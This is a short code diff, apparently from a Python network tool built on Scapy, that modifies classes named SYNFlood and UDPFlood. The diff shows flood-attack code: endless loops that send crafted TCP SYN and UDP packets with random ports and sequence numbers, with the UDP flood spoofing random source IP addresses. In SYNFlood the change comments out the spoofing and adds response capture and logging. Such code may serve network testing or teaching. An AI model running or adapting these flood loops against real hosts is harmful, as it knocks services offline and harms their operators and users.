@@ -44,11 +44,12 @@ class SYNFlood(_Attacker):
         pkt = ip/tcp
 
         while True:
-            pkt[IP].src = str(IPv4Address(getrandbits(32)))  # source iP
+            # pkt[IP].src = str(IPv4Address(getrandbits(32)))  # source iP
             pkt[TCP].sport = getrandbits(16)     # source port
             pkt[TCP].seq = getrandbits(32)     # sequence number
-            print(pkt.summary())
-            send(pkt, verbose=0)
+            print('send: ', pkt.summary())
+            resp = sr1(pkt, verbose=0)
+            print('recv: ', resp.summary())
 
 
 class UDPFlood(_Attacker):
@@ -69,8 +70,9 @@ class UDPFlood(_Attacker):
         while True:
             pkt[IP].src = str(IPv4Address(getrandbits(32)))  # source iP
             pkt[UDP].sport = getrandbits(16)     # source port
-            print(pkt.summary())
+            print('send: ', pkt.summary())
             send(pkt, verbose=0)
+
 
 
 class TraceRoute(_Attacker):
